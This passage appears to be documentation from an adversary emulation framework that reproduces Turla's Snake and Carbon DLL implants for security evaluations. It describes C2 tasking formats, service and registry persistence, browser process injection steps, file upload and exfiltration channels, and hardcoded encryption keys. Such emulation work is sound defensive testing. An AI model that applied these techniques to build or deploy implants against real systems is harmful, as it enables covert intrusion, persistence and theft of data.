tasking","encrypting payloads sent to implant","decrypting command output received from implant","decrypting log files and other file uploads received from implant"]},{"l":"Usage"},{"l":"Configuration","p":["To enable and configure the Snake HTTP handler within the control server, edit the config/handler_config.yml from the main C2 server repo. Adjust the Snake HTTP entry as needed.","Example:","Run the controlServer binary as sudo and look for success messages in starting up the Snake handler:"]},{"l":"Tasking Implants","p":["{type: 1, command: ...} or {type: 1, command: ..., runas:domain\\user}- the command type code 01 will have the implant execute a cmd.exe command with the provided args. Note that a command is required for task type 1. The implant will send the command output to the C2 server. If a username is provided via the runas key, the command process will be created under that user if possible.","{type: 2, command: ...}- the command type code 02 will have the implant execute a powershell.exe command with the provided args. Note that a command is required for task type 2. The command will be encoded to UTF-16LE and then base64 encoded so that the implant can run it via powershell.exe -nol -noni -nop -enc. The implant will send output to the C2 server afterwards. If a username is provided via the runas key, the command process will be created under that user if possible.","{type: 3, proc: path_to_binary_to_execute} or {type: 3, proc: path_to_binary_to_execute, args: arg1 arg2 ... argN}- the task type code 3 will instruct the implant to execute the binary at the provided path and with the provided args, if any args are provided. The implant will send output to the C2 server afterwards. If a username is provided via the runas key, the command process will be created under that user if possible.","{type: 4, file: payload_to_download, dest: dest_path_on_victim}- the task type 4 will have the implant request a file download from the C2 server for payload_to_download, and the file will be saved as dest_path_on_victim, or the snake home directory if only a file name is specified. To have the file downloaded to the current directory, use the .\\ path prefix (e.g. .\\filename).","{type: 5, file: path_to_file_to_upload}- the task type 05 will request the implant to upload a local file from the target machine, specified by path_to_file_to_upload","{type: 6}- the task type 6 will request the implant to upload its logs.","args- for the process execution type code ( 3), this represents the arguments to execute the process with (e.g. /all for whoami.exe)","As with other C2 handlers, implant tasking is performed by sending requests to the internal REST server using the evalsC2client.py script. The Snake HTTP handler will allow operators to task the following command types using a JSON dict payload format.","Below are examples of each type code:","command- for type codes dealing with cmd.exe or powershell execution, this string represents the command to run. For example, whoami /all or get-childitem .","dest- for the payload download type code ( 4), this represents the destination file path to save the payload.","Examples of invalid tasking:","Examples of valid tasking:","file- for the payload download type code ( 4), this represents the filename to request from the C2 server. For the file upload task code ( 5), this represents the file path of the local file to upload.","For example:","proc- for the process execution type code ( 3), this represents the binary name/path to execute (e.g. whoami.exe)","runas- for process or command execution tasks, this represents the user to create the process under (e.g. mydomain\\dummyuser)","The JSON dict can contain the following fields:","To register or receive tasking for an implant session, the Snake HTTP handler expects a GET request for /PUB/{identifier}, where {identifier} is the implant ID. If this is the first time that the Snake HTTP handler recognizes the implant with id {identifier}, then it will set up a new session within the internal C2 REST server and then begin tasking the implant upon subsequent GET requests to the same endpoint.","type- command type code that specifies the type of command to send (e.g. execute a process, download a file, upload a file). Must be an integer"]},{"l":"Decrypting Logs","p":["If you need to decrypt Snake log files and you don't have a responding or live implant, you can transfer the log files from the victim machine to the C2 server machine and use the decrypt_logs.py utility in this folder:"]},{"l":"CTI References","p":["https://artemonsecurity.com/snake_whitepaper.pdf"]}],[{"l":"Carbon DLL"},{"l":"Overview","p":["Carbon DLL is a second-stage malware that Turla has used in operations 1. Carbon DLL is implemented as 2 usermodule DLLs and is executed via a service binary, acting as a usermode-only variant of the Carbon rootkit and using asymmetric encryption for C2 traffic via HTTP requests. 1, 2."]},{"l":"Components","p":["The Carbon DLL resources in this repository include the following components 1, 3:","Carbon DLL dropper/installer, which drops the components and configuration file and creates and starts the loader service","Carbon orchestrator DLL, which executes tasks and injects the communications DLL into a browser process","Carbon communications DLL, which communicates with the C2 server and relays tasks to the orchestrator DLL","Loader DLL that is executed as a service in order to kick off the orchestrator DLL."]},{"i":"dropperinstaller","l":"Dropper/Installer","p":["%programfiles%\\Windows NT\\0511 for tasking info","%programfiles%\\Windows NT\\2028 for task output","%programfiles%\\Windows NT\\Nlts for task config files","After successful file writes, the dropper will create a service to execute the loader DLL. 3","Bin path: C:\\Windows\\System32\\svchost.exe -k WinSysRestoreGroup(svchost is used since we are running a DLL as a service).","C:\\Program Files\\Windows NT is set as the Carbon working directory. Per CTI, Carbon randomly selects a folder from C:\\Program Files 1, but we only use Windows NT in the emulated version to maintain consistent evaluations.","Communications library DLL to %programfiles%\\Windows NT\\MSXHLP.dll","Configuration file to %programfiles%\\Windows NT\\setuplst.xml","Display name: WinSys Restore Service","Loader DLL to %systemroot%\\System32\\mressvc.dll","Once the service is set up, the dropper will start it before terminating its own execution.","Orchestrator DLL to %programfiles%\\Windows NT\\MSSVCCFG.dll","Service Name: WinResSvc","The Carbon DLL dropper will create the following subdirectories in the Carbon working directory:","The Carbon DLL dropper will drop the following files to disk 1, 3:","The dropper then performs two registry writes to make sure that the service can find the loader DLL and that the service will run under svchost:","The loader DLL path (%systemroot%\\system32\\mressvc.dll) is written to registry key HKLM:\\SYSTEM\\CurrentControlSet\\services\\WinResSvc\\Parameters under the ServiceDll value","The service details are as follows:","The service name ( WinResSvc) is written to registry key HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost under the WinSysRestoreGroup value","Turla has used the same display name in the past, though we changed the service name to avoid using the exact same naming convention."]},{"l":"Loader DLL","p":["The loader DLL is dropped by the Carbon DLL dropper and then executed via service under svchost. The loader DLL exports a ServiceMain function in order to be run as a service.","When running as a service, the loader DLL will execute the orchestrator DLL by calling its exported CompCreate function, analogous to how Turla executed Carbon DLL with a different exported function name. 3. Note that the loader DLL grabs the orchestrator DLL from disk."]},{"l":"Communications DLL","p":["The Carbon communications library DLL is injected into browser processes by the Orchestrator DLL. Its primary role is to communicate with the C2 server as an HTTP client, or via named pipes if running in peer-to-peer mode, to retrieve tasking information and relay it to the Orchestrator DLL for execution.","For more details on how the comms lib DLL functions and interacts with other Carbon DLL artifacts, please refer to the Comms Lib DLL README file."]},{"l":"Orchestrator DLL","p":["The Carbon DLL Orchestrator is run by the Carbon DLL loader service in order to inject the C2 communication DLL (comms lib) into a legitimate process and execute tasks that the comms lib receives from the C2 server. 1","For more details on how the Orchestrator DLL functions and interacts with other Carbon DLL artifacts, please refer to the Orchestrator DLL README file."]},{"l":"Carbon DLL Directory Structure","p":[".\\0511",".\\0511\\workdict.xml",".\\2028",".\\2028\\dsntport.dat",".\\2028\\traverse.gif",".\\bootinfo.dat",".\\history.jpg",".\\MSSVCCFG.DLL",".\\MSXHLP.DLL",".\\Nlts",".\\setuplst.xml","comms lib dll","comms lib log file","Description","directory for log and task result files","directory for task config files","directory for tasks and task info","File/Folder","For more information on the configuration file and its fields, please see the configuration file section in the Orchestrator README file.","In addition to using different names, the emulated file structure differs from CTI by using only one task file rather than separate ones for both the orchestrator and comms lib DLLs, since only the orchestrator executes tasks in the emulated variant.","list of task result files to send to c2","main Carbon config file","orchestrator dll","orchestrator error log","orchestrator log file","orchestrator tasks","The file structure used by the emulated Carbon DLL is based on a combination of Carbon 3.7X Carbon 3.8X file structures. 1","The table below lists the files and folders in the Carbon DLL working direcotry. In a successful installation, the files and folders listed below will always be created; however, specific task-related files will have varying names based on the corresponding task ID."]},{"l":"Usage","p":["To install Carbon DLL, simply run the installer executable as an administrator.","Instructions on how to task Carbon DLL can be found in the Carbon DLL C2 handler README file.","For more specific usage information for individual components, please refer to their respective README files."]},{"l":"Troubleshooting","p":["If the installer returns an error in its output, the error code will either be a Windows system error code or a custom error code defined in CarbonInstaller/Dropper/include/file_handler.h or CarbonInstaller/Dropper/include/service_handler.h.","To check if files were dropped, you can open up file explorer on the target host and look in C:\\Program Files\\Windows NT","To check if the service is created and running, open up task manager, go to the services tab, and then look for the WinResSvc service.","If the service does not exist or is not running, you may need to check privileges or cleanup and try again.","If the WinResSvc is stopped, or if it's running and you still don't have a Carbon beacon even with Edge open, you can check for the Carbon Orchestrator log and error files at C:\\Program Files\\Windows NT\\history.jpg and C:\\Program Files\\Windows NT\\bootinfo.dat, respectively.","These log files can be decrypted on a Windows machine using the Orchestrator/bin/castDecrypt.exe utility.","The bootinfo.dat error file will likely explain why injection into Edge failed, or if the orchestrator failed in an earlier spot.","If neither file exists, it's likely the service was unable to start, and you will likely need to perform cleanup and try executing the installer again.","If you're still having issues obtaining an initial beacon despite successful injection, or if you obtained a beacon and then lost communication from the Carbon implant, look for the C:\\Program Files\\Windows NT\\2028\\dsntport.dat communications module log file.","This log file can be decrypted on a Linux machine using the CommLib/decrypt_logs.py utility:","If this file does not exist, then that means the communications library was either not injected or was not even able to start up.","Once decrypted, you can look through the log for indicators of problems, such as pipe communication issues for peer-to-peer.","Error codes in the log file will either be a Windows system error code or a custom error code defined in header files within the CommLib/include directory."]},{"l":"Cleanup","p":["To remove artifacts, run the Carbon cleanup Powershell Script as an administrator on the target host(s).","You can do so from a domain controller using the following powershell command (from a directory containing the script):","For example, to cleanup the Carbon Scenario from evaluations:","From the Kali Linux machine ( 176.59.15.33):","From the domain controller RDP session, open an Admin PowerShell and execute the cleanup script:","Sign out of the RDP session when finished."]},{"l":"Build","p":["For specific build instructions, refer to the README files for each individual component."]},{"l":"Testing","p":["For specific test instructions, refer to the README files for each individual component."]},{"l":"References and CTI","p":["https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/","https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html","https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra"]}],[{"l":"Carbon DLL Installer"},{"l":"Usage","p":["To run the installer, simply run the dropper.exe executable (release builds located in bin/) as an administrator."]},{"l":"Component Breakdown"},{"l":"Dropper","p":["%programfiles%\\Windows NT\\0511 for tasking info","%programfiles%\\Windows NT\\2028 for task output","%programfiles%\\Windows NT\\Nlts for task config files","After successful file writes, the dropper will create a service to execute the loader DLL. 3","Bin path: C:\\Windows\\System32\\svchost.exe -k WinSysRestoreGroup(svchost is used since we are running a DLL as a service).","Communications library DLL to %programfiles%\\Windows NT\\MSXHLP.dll","Configuration file to %programfiles%\\Windows NT\\setuplst.xml","Display name: WinSys Restore Service","Loader DLL to %systemroot%\\System32\\mressvc.dll","Once the service is set up, the dropper will start it before terminating its own execution.","Orchestrator DLL to %programfiles%\\Windows NT\\MSSVCCFG.dll","Service Name: WinResSvc","The Carbon DLL dropper will create the following subdirectories in the Carbon working directory:","The Carbon DLL dropper will drop the following files to disk 1, 3:","The dropper then performs two registry writes to make sure that the service can find the loader DLL and that the service will run under svchost:","The loader DLL path (%systemroot%\\system32\\mressvc.dll) is written to registry key HKLM:\\SYSTEM\\CurrentControlSet\\services\\WinResSvc\\Parameters under the ServiceDll value","The service details are as follows:","The service name ( WinResSvc) is written to registry key HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost under the WinSysRestoreGroup value","Turla has used the same display name in the past, though we changed the service name to avoid using the exact same naming convention."]},{"l":"Dropper Build Instructions","p":["Since the Carbon DLL dropper contains the various implant components (config file and DLLs), you will need to add those components in as resources at compile-time. Use the add_resources.py script to auto-generate the src/components.cpp file that contains each of the latest resource components. Supply the appropriate file paths to the latest version of each resource that you want to include.","Note that PyCryptoDome is required. You can installed it with the following command:","To generate the src/components.cpp file:","The encryption key used for adding resources is f2d4560891bd948692c28d2a9391e7d9, which was generated by using PBKDF2 with 5 iterations of SHA1, passphrase of checkmatepepper and salt of salty, resulting in a 128-bit key. Example using CyberChef)","Now that you have all of the resources in src/components.cpp, you can build the dropper executable.","The dropper executable was built on Kali Linux using the following build command from the Dropper directory:","To remove symbols, you can use the strip command:","To verify, you can run strings or objdump --syms bin/dropper.exe- you should see an empty symbols table."]},{"l":"Loader DLL","p":["The loader DLL is one of the components dropped by the Carbon DLL dropper. The dropper will then create a service to run the loader DLL under svchost, which requires some registry key creation and modification. The loader DLL exports a ServiceMain function in order to be run as a service.","When running as a service, the loader DLL will execute the orchestrator DLL by calling its exported CompCreate function. 3"]},{"l":"Loader DLL Build Instructions","p":["The loader DLL executable was built on Kali Linux using the following build command from the Loader directory:","To remove symbols, you can use the strip command:","To verify, you can run strings or objdump --syms bin/loader.dll- you should see an empty symbols table."]},{"l":"Cleanup","p":["To remove artifacts, run the Resources/cleanup/Carbon/carbon_cleanup.ps1 Powershell Script as an administrator on the target host(s).","You can do so from a domain controller using the following powershell command (from a directory containing the script):"]},{"l":"Troubleshooting","p":["If the installer returns an error in its output, the error code will either be a Windows system error code or a custom error code defined in Dropper/include/file_handler.h or Dropper/include/service_handler.h.","To check if files were dropped, you can open up file explorer on the target host and look in C:\\Program Files\\Windows NT","To check if the service is created and running, open up task manager, go to the services tab, and then look for the WinResSvc service.","If the service does not exist or is not running, you may need to check privileges or cleanup and try again.","If the WinResSvc is stopped, or if it's running and you still don't have a Carbon beacon even with Edge open, you can check for the Carbon Orchestrator log and error files at C:\\Program Files\\Windows NT\\history.jpg and C:\\Program Files\\Windows NT\\bootinfo.dat, respectively.","These log files can be decrypted on a Windows machine using the Resources/Carbon/Orchestrator/bin/castDecrypt.exe utility.","The bootinfo.dat error file will likely explain why injection into Edge failed, or if the orchestrator failed in an earlier spot.","If neither file exists, it's likely the service was unable to start, and you will likely need to perform cleanup and try executing the installer again.","If you're still having issues obtaining an initial beacon, or if you obtained a beacon and then lost communication from the Carbon implant, look for the C:\\Program Files\\Windows NT\\2028\\dsntport.dat communications library log file.","This log file can be decrypted on a Linux machine using the Resources/Carbon/CommLib/decrypt_logs.py utility:","If this file does not exist, then that means the communications library was either not injected or was not even able to start up.","Once decrypted, you can look through the log for indicators of problems, such as pipe communication issues for peer-to-peer."]},{"l":"Installer Build Commands for the Scenario","p":["Optional: rebuild the Loader DLL (run from the Loader directory:","To compile the installer, run the following from a Linux machine from the Dropper directory:"]},{"l":"Unit Tests","p":["(OPTIONAL) If running CMake via Visual Studio Code:","Add C:\\tools\\msys64 to your PATH enviromment variable to run msys2. Reopen console windows to register the new env variable.","C:\\Program Files\\CMake\\bin or equivalent CMake bin folder","C:\\tools\\msys64\\mingw64\\bin or equivalent Mingw-w64 bin folder","C/C++","choco install cmake --installargs 'ADD_CMAKE_TO_PATH=System'","choco install msys2","CMake","CMake Tools","CMake: CMake Path","CMake: Generator","Configure CMake settings in VS Code:","Ensure the following paths are set in the SYSTEM environment PATH variable (note that these may differ in your environment depending on how you installed CMake and mingw64).","If cmake was already installed but is not in your path, add it to your path manually (e.g. C:\\Program Files\\CMake\\bin)","In Command Palette, run CMake: Run Tests","Make sure CMake is installed on your machine","Make sure mingw64 is installed on your machine. In this particular example, msys2 was installed and used to install mingw64.","Make sure you have the following VS Code extensions:","Open the corresponding project folder in VS Code ( Dropper or Loader)","pacman -S --needed base-devel mingw-w64-x86_64-toolchain","pacman -Syu","Paths to folders containing gcc and g++ compilers if not already included in the above Mingw-w64 path folder.","Reopen console windows to register the new env variables.","Run msys2 and within the new prompt, run the following:","Set to \"MinGW Makefiles\" (no quotes)","Set to wherever the cmake executable is located","Set up and run tests via Powershell from the directory of the component to check (e.g. Dropper or Loader):","Unit tests were run on a Windows machine using CMake. Each component subfolder has its own unit test setup.","You will need to restart the shell to use cmake."]},{"l":"CTI References","p":["https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/","https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html","https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra"]}],[{"l":"Carbon-DLL Orchestrator DLL"},{"l":"Orchestrator"},{"l":"Overview","p":["The Carbon DLL Orchestrator (orch) will be started from the Carbon installer service and inject the C2 communication DLL (comms lib) into a legitimate process. 1 The orchestrator will create mutexes for the comms lib and itself to manage file access. 1 The orchestrator will monitor a specific file to find tasks that the comms lib pulled from the C2. 1 The orchestrator will publish its completed tasks and relevant information to another file that the comms lib monitors so that the information can be sent back to the C2. 1"]},{"l":"Files"},{"l":"File Structure and Explanation","p":[".\\0511",".\\0511\\workdict.xml",".\\2028",".\\2028\\dsntport.dat",".\\2028\\traverse.gif",".\\bootinfo.dat",".\\history.jpg",".\\MSSVCCFG.DLL",".\\MSXHLP.DLL",".\\Nlts",".\\setuplst.xml","C:\\Program Files\\Windows NT is set as the Carbon working directory. Per CTI, Carbon randomly selects a folder from C:\\Program Files 1, but we only use Windows NT to maintain consistent evaluations.","comms lib dll","comms lib logging","Description","directory for log and task result files","directory for tasks and task configs","directory to contain task config files","error log","File/Folder","list of files to send to c2","main config file","orchestrator dll","orchestrator tasks","result log","The file structure for Carbon was based on a combination of Carbon 3.7X Carbon 3.8X file structures 1 Our file structure differs from CTI in that we do not have a separate task file for both the orchestrator and the comms lib since only the orchestrator executes tasks. We also excluded the two .png files in the Carbon 3.8X file tree that do not have an explanation of their purpose.","The files and folders listed here will always be created, but task output file names are defined in each line of workdict.xml."]},{"l":"Configuration File","p":["[CRYPTO]","[CW_INET]","[CW_LOCAL]","[DHCP]","[FILE]","[LOCATION]","[LOG]","[MTX]","[NAME]","[PROC]","[TIME]","[TRANSPORT]","[WORKDATA]","^","A list of the target applications for the orchestrator to inject into","adaptable","address1","cfg","Description","elog","If this implant will run in p2p client mode or not","log","log_dir","logperiod","net_app","not used in our implementation","object_id","p2p_client","peer_pipe","quantity","rsa_priv","Section","send","server","Setting","spstatus","system_pipe","t_cfg_dir","task_dir","The Carbon installer will drop an encrypted setuplst.xml config file to the working directory that the orchestrator and comms lib will read. Our config file was based off the Carbon 3.77 config file. 1 A plain text version of the config file is available in bin/configPlainText.xml.","The name of the directory that contains task config files","The name of the directory that contains task output related files","The name of the directory that contains the task file","The name of the error log file","The name of the file that lists files to send to the C2","The name of the main config file","The name of the mutex for the error log file","The name of the mutex for the file that lists files to send to the C2","The name of the mutex for the regular log file","The name of the mutex for the task file","The name of the pipe used for p2p","The name of the regular log file","The name of the task file","The pipe to send C2 communications back to","The private RSA key for the comms lib to decrypt communications from the C2","The URL of the C2 endpoint","The uuid of this implant","These are the different sections, settings, and their descriptions in the config file:","tsk","Upon startup, the first thing the orchestrator will do is read this config file. If there is an option missing from the config file that the orchestrator is expecting, it will fall back to a default value. These are listed in the src/orchestrator.cpp file."]},{"l":"Functionality"},{"l":"Encryption","p":["source","Each file output from the orchestrator will be encrypted with CAST-128. 1 We used a hardcoded key with a hex value of f2d4560891bd948692c28d2a9391e7d9 in our implementation. The orchestrator expects the config file to be encrypted, and will first decrypt it and load configuration information before performing any action.","The orchestrator also expects task-related files to be encrypted and will decrypt tasking information before proceeding to task execution. Task output is encrypted on disk for the comms lib to pick up and send to the C2 server."]},{"l":"Mutexes","p":["source","The orchestrator will create five mutexes to coordinate file access between the comms lib and itself. The mutexes created were based off Carbon 3.8X. 1 The number of mutexes used here was reduced by two when compared to the CTI because we do not use an equivalent of xmlrts.png, and only the orchestrator is completing tasks, so there is less simultaneous read/write access between the orchestrator and the comms lib.","These are the mutexes created by the orchestrator and their descriptions:","Mutex","Description","Global\\Microsoft.Telemetry.Configuration","Represent config file setuplst.xml ownership","Global\\DriveEncryptionStd","Represent task file workdict.xml ownership","Global\\DriveHealthOverwatch","Represent send file traverse.gif ownership","Global\\Threading.Management.Info","Represent error log bootinfo.dat ownership","Global\\Stream.Halt.Restoration","Represent regular log history.jpg ownership"]},{"l":"Injection","p":["source","The orchestrator will inject the 3rd stage communications library into processes that typically generate HTTP traffic, such as a web browser. 1, 2, 3 For our evaluations, only Microsoft Edge was tested with the orchestrator. Injection into other web browsers should be possible, but this is not tested.","Injection is performed in the following steps:","enable debug privileges for the current process source","read the config file for a list of target processes source","look for those processes on the current machine, and record the PIDs of the ones found source","get a handle to KERNEL32.dll from a target process source","perform the injection using GetProcAddress for LoadLibraryA, OpenProcess for the target process, VirtualAllocEx, WriteProcessMemory, and finally CreateRemoteThread source","After successful injection, the comms lib DLL will start to communicate with the C2 server.","The orchestrator uses OpenProcess and WaitForSingleObject to monitor the process that the comms lib was injected into. If that process is terminated, the orchestrator will attempt to find a new host process to re-inject the comms lib."]},{"l":"Tasking","p":["a number designating which task this is","A task config file can exclude the name field, and cmd.exe will be filled in by default. However, an operator should not need to worry about creating the task config files ask this is done automatically by the comms lib, and an operator should refer to the Carbon C2 handler for instructions on how to task the implant. If tasks are found, the orchestrator will parse them, pick out each section of the task, and then execute the task. The orchestrator is able to execute multiple tasks sequentially if there are multiple in the tasking file. Once the orchestrator has completed executing all of the tasks, it will remove them from the tasking file and release the mutex for the tasking file. Then, the orchestrator will take any output and log information from the task it performed, and put those in the task_result_filepath and task_log_filepath respectivley. The orchestrator will then gain ownership of the mutex for and make an entry in the \"files to send to the C2\" file, traverse.gif. The format for these entries is as follows:","Description","exe","Field","filepath","Mutex","name","num_files","Since only sending 1 file per entry is supported, each task will create two entries in traverse.gif, one for the result file and one for the log file. The comms lib will then check traverse.gif for entries, and when found, will send those files to the C2 server.","source","task_config_filepath","task_filepath","task_id","task_log_filepath","task_result_filepath","the arguments to run the file with","The comms lib will post tasks for the orchestrator in workdict.xml. The orchestrator will check workdict.xml for updates every 5 seconds. The format for each task is as follows 1:","The format for a task config file is as follows:","the location of a file that the orchestrator will execute for this task","the location of the configuration file specific to this task","the location where the orchestrator will output its log for this task","the location where the orchestrator will output the task result (i.e. command output)","the name of the file to run (cmd.exe by default)","the number of files to send (only 1 is supported)","the path of the file to send","the uuid of the implant, as defined in the config file","uuid"]},{"l":"Testing Information","p":["After all requisite files are found, output-itest.ps1 will clean the working directory, C:\\Program Files\\Windows NT, of any artifacts. Next, output-itest.ps1 will manually create the directories in C:\\Program Files\\Windows NT that Carbon requires. Then, it will copy over the files from turla\\Resources\\Carbon\\Orchestrator\\resources. Now, it will start Carbon using dllrunner.exe and ./bin/runner.exe to start the comms lib and orchestrator respectivley. Once you are done testing, you can enter 1 in the script to view the log files, where the script will run ./bin/castDecrypt.exe for both history.jpg and bootinfo.dat. Finally, the script will clean up any artifacts created from testing.","Currently, the orchestrator will output everything it logs to console for testing purposes. Using any of the testing scripts will perform process injection","dllrunner.exe: dll runner used to start the comms lib (output-itest.ps1 only)","If the installer does not have the most recent versions of the orchestrator or comms lib, you can test the orchestrator with the included output-itest.ps1 script.","If you encounter an error, ./include/orchestrator.h has a mapping of error code to a basic name of the error to help diagnose the issue.","MSSVCCFG.dll: the orchestrator","MSXHLP.dll: the comms lib","output-itest.ps1 runs the orchestrator and comms lib separately so that the user has console output for both. Both testing scripts require that files are placed in turla\\Resources\\Carbon\\Orchestrator\\resources:","resources/Payloads/DllLoader/dllrunner.exe(resources repo, not turla)","setuplst.xml: the encrypted config","The c2 server seems to want one task at a time. You need to start the c2 before you start carbon.","The easiest way to test the orchestrator is to use the Carbon Installer.","These files can be found in these locations respectively:","turla/Resources/Carbon/CommLib/bin/commlib.dll(needs to be renamed)","turla/Resources/Carbon/Orchestrator/bin/MSSVCCFG.dll","turla/Resources/Carbon/Orchestrator/bin/setuplst.xml","You will need to have a c2 server running and issue a task in order to see that Carbon is working. The following task was used to test that Carbon is working properly: ./evalsC2client.py --set-task SOMEUUID '{id: 1, code: 0, cmd: whoami /all}'. You can change the cmd: whoami /all section to execute another command, such as cmd: systeminfo. Please ensure that the comms lib is looking at the right IP/port for your c2 server. This is defined in the config under address1, which you only need to change the IP and port. If you need to edit the config, you can encrypt it by making your changes to ./bin/configPlainText.xml and running ./bin/configEncrypt.exe. This will overwrite ./bin/setuplst.xml with the updates made to ./bin/configPlainText.xml."]},{"l":"Build Instructions","p":["All PE files were build on Windows 10 with MinGW32. You can use the included build.ps1 script to automatically remove and rebuild the PE files. build.ps1 is designed to build a dll from .\\test\\dllspawnnp.cpp and place it in .\\bin\\MSXHLP.dll so that it can be injected by the orchestrator for testing. However, having the .\\test\\dllspawnnp.cpp file is not required to be able to build using build.ps1, and the script will skip that file if it does not exist. build.ps1 will also remove the symbols from the orchestrator dll and check that they have been removed.","If you wish to build the PE files manually, these are the commands that are used to do so.","You can remove symbols from the orchestrator dll with the following command:","To verify, you can run objdump --syms .\\bin\\MSSVCCFG.dll- you should see an empty symbols table."]},{"l":"Cleanup Instructions","p":["When running the orchestrator with the Carbon Installer, refer to the Carbon Installer's turla/Resources/cleanup/Carbon/carbon_cleanup.ps1 script for cleanup."]},{"l":"CTI References","p":["https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/","https://www.gdatasoftware.com/blog/2015/01/23926-analysis-of-project-cobra","https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html"]}],[{"l":"CommLibDLL"},{"l":"Overview","p":["This library will be injected into a Windows process and used to communication with the C2 server. Communication may be direct, or be routed through a different instance of this library on a seperate computer. The messages received from the C2 server are primarily tasks from the C2 server, which are stored in a file for the Carbon Orchestrator to run. This library also checks for task results from the Orchestrator and sends those results to the C2 server."]},{"l":"C2 Communications","p":["The communication library DLL supports two modes of communication with the C2:","direct C2 channel using HTTP","peer-to-peer C2 communication using named pipes"]},{"l":"HTTP Communications","p":["The library module will determine the C2 server address, port, and URL path from the options provided in the config file. A heartbeat request is sent to the C2 addr/url to check that the server is alive. If alive, the module will then use the PHPSESSID cookie in future requests with the appropriate implant ID value to tell the C2 server who the beacon is for.","HTTP GET requests are sent to request tasking, and POST requests are used to send task output.","For tasking, the server will send an HTML response with the base64-encoded encrypted task information placed as the value HTML tag value. The task information will contain payload and command information, which the module will use to do the following:","write the payload to disk at the specific location (if a payload is provided)","build a task config file containing the payload location (if a payload is provided) and the command to run. The task config file will be placed in the C:\\Program Files\\Windows NT\\Nlts\\a67s3ofc[task id].txt filepath. For instance, if the task id is 15, the config file will be placed in C:\\Program Files\\Windows NT\\Nlts\\a67s3ofc15.txt","append the following line to the task list file at C:\\Program Files\\Windows NT\\0511\\workdict.xml:","task_id | payload_path (optional) | task_config_path | task_output_path | task_log_path","example: 12 | C:\\\\users\\\\public\\\\testpayload | C:\\Program Files\\Windows NT\\Nlts\\a67s3ofc15.txt | C:\\Program Files\\Windows NT\\2028\\15.yml | C:\\Program Files\\Windows NT\\2028\\15.log","For task output, the comms lib module will look for available task output info in the task output metadata file (configurable during compilation, currently set to C:\\Program Files\\Windows NT\\2028\\traverse.gif). This file contains lines of the following format:","Example:","The implant will upload the contents of the task output file and clear the task output metadata file."]},{"l":"Named Pipe Peer-to-Peer","p":["To configure named pipe peer-to-peer options, you can adjust the options under the [TRANSPORT] section of the main configuration file:","Currently, spstatus and adaptable are not used and can be ignored.","system_pipe refers to the name of the pipe used on all machines for peer-to-peer comms","p2p_client toggles whether or not the implant will use named-pipe p2p or HTTP comms to reach the C2 server. To enable, set the value to true or yes.","peer_pipe indicates the full pipe address (including hostname and pipename) of the peer to connect to for named pipe p2p communication. Note that this pipe address must align with whatever the system_pipe value is for the configuration file of the peer","If the module is running in HTTP comms mode, it will mark itself as available for p2p requests by listening on the pipe specified in system_pipe. Peers can then connect to this pipe if the address is provided in peer_pipe in their config file. P2p clients will send beacon requests and task output to p2p listeners, who will then relay this information to the C2 server on behalf of the client, returning any server responses such as tasking and payloads. P2p clients will also listen on their own local named pipe (indicated by system_pipe for responses from ther peers.","Note that because no usernames/passwords are explicitly used, any pipe connection will be done under the user context of the process running the comms library DLL module. Thus, operators must make sure that the p2p participants can access each other's named pipes."]},{"l":"Encryption","p":["The comms library module uses CAST-128 encryption with some of its files and C2 communication 1:","CAST-128 encryption is used to encrypt/decrypt certain files on disk:","main implant configuration file C:\\Program Files\\Windows NT\\setuplst.xml","the pending task file for the orchestrator to pick up ( C:\\Program Files\\Windows NT\\0511\\workdict.xml)","associated task configuration files ( C:\\Program Files\\Windows NT\\Nlts\\a67s3ofc[task id].txt)","task output files ( C:\\Program Files\\Windows NT\\2028\\[task id].log)","metadata file containing info on task output to submit to the C2 server ( C:\\Program Files\\Windows NT\\2028\\traverse.gif)","Named pipe peer-to-peer communication between hosts is encrypted using CAST-128 1","The embedded base64 blob in HTML responses from the C2 server contains a 2-part concatenated ciphertext blob. The first 256 bytes contain an RSA ciphertext, which when decrypted provides a base64-encoded random CAST-128 symmetric key. This key is then used to decrypt the rest of the ciphertext blob, which contains the actual task information. The RSA private key used for the first round of decryption is included in the configuration file and is set to (DER-encoded base64):","Carbon DLL has used a similar encryption setup for C2 responses in the past 1, with additional components such as an intermediary signature block.","Carbon DLL has used hardcoded encryption keys in the past. For the comms library module, the CAST-128 symmetric key for file encryption is hardcoded as the following (hex-encoded): f2d4560891bd948692c28d2a9391e7d9","Note that in all cases, CAST-128 encryption was done in CBC mode, and RSA encryption was done with OAEP padding and SHA1 hash.","The 2048-bit RSA public/private key pair used for this implant was generated using Crypto++'s GenerateRandomWithKeySize method and then encoded to DER format. To convert from DER to PEM format, you can use the following openssl commands:"]},{"l":"Logging","p":["To assist operators in troubleshooting, the comms lib will log errors and debugging output to the following file on the target host: C:\\Program Files\\Windows NT\\2028\\dsntport.dat. Each log file line is base64-encoded and CAST-128 encrypted with the following format:","The CAST-128 encryption key is the same hardcoded key used to encrypt/decrypt other files.","To decrypt the logs on a Linux machine, you can use the decrypt_logs.py utility:"]},{"l":"How to Run","p":["The primary DLL will be injected into browsers by the Carbon Orchestrator DLL."]},{"l":"How to Perform Cleanup","p":["There is no required cleanup for testing the library. However, for cleaning up Carbon in execution, see the cleanup file at turla/Resources/cleanup/Carbon/carbon_cleanup.ps1."]},{"l":"How to Build","p":["This program is using CMake to compile and CL compiler for Windows.","The module requires the Crypto++ library to be built and linked at compile-time. vcpkg was used to install crypto++ for x64-windows, and the installation directory is set as the VCPKG_ROOT system environment variable."]},{"l":"Via Commandline","p":["Build the comms library DLL using the following cmake commands in administrator Powershell from the Resources\\Carbon\\CommLib directory. If you want to adjust certain preprocessor directives for the Carbon home directory, config file path on disk, and finished tasks path directory, you can do so in the compilation command:","To remove symbols, you can use the strip command:","To verify symbol removal, you can run strings or objdump --syms bin\\commlib.dll- you should see 